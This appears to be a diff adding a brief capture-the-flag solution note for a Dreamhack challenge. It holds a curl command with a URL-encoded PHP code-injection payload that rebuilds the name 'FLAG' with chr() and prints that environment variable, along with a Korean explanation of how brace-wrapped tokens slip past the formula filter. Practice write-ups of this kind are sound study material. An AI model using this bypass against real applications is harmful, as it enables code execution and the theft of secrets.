@@ -1,0 +1,4 @@
+curl "http://host8.dreamhack.games:17629/cal.php?f=%7Bprint%28getenv%28chr%2870%29.chr%2876%29.chr%2865%29.chr%2871%29%29%29%7D"
+{print(getenv(chr(70).chr(76).chr(65).chr(71)))}
+취약점 → check_formula 에서 중괄호로 감싼 특정형식의 토큰을 1.0으로 치환함 
+그래서 그안의 내용들이 필터링에서 넘어가는데 실행단계에서 중괄호를 소괄호로 바꾸어주는 로직이 존재함 -> 취약점 생김
